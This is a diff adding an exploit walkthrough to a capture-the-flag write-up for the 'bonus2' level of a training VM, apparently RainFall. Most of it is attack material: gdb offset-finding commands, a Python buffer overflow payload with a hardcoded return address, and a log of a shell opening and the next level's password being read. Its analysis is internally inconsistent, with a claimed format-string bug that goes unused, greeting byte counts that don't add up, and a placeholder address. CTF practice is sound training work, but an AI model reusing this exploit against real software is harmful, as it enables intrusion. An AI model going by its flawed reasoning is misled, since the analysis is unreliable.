@@ -1,10 +1,56 @@
 # Vulnerability
-Environment variable handling with `strncpy()`.
+Buffer overflow: 40 + 32 = 72 bytes fills buffer exactly
+Format string: printf(buffer) uses buffer as format string
+No null terminator guarantee from strncpy()
 
-# Key Points
-- Reads LANG environment variable
-- Uses `strncpy()` but calculations allow overflow
-- Combines multiple buffers unsafely
 
-# Exploit
-Set LANG variable to overflow when combined with user input.
+# Stack Layout
+[buffer: 72 bytes][saved ebp: 4][return address: 4]
+
+# Exploitation Strategy
+Fill buffer with 72 bytes + return address to trigger overflow when printf adds greeting.
+
+# Finding Offset
+```sh
+export LANG=fi
+(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*32')
+(gdb) x/30wx $esp
+# Find where we overwrite return address
+```
+
+# Calculating Overflow
+```sh
+# "Hyvää päivää " = 14 bytes
+# "Goedemiddag! " = 13 bytes
+# These are added before buffer in printf
+
+# Total: greeting + buffer[72] can overflow
+```
+
+# Exploitation
+```py
+#!/usr/bin/env python
+# Finnish greeting adds 14 bytes before buffer
+arg1 = "A" * 40
+arg2 = "B" * 23 + "\x44\x84\x04\x08"  # Adjust address
+
+print arg1 + " " + arg2
+```
+
+# Execution
+```sh
+bonus2@RainFall:~$ export LANG=fi
+bonus2@RainFall:~$ ./bonus2 $(python exploit.py)
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBB�D
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+
+# Key Concepts
+Environment variable exploitation
+Buffer overflow via concatenation
+Format string vulnerability
+Locale-based exploitation
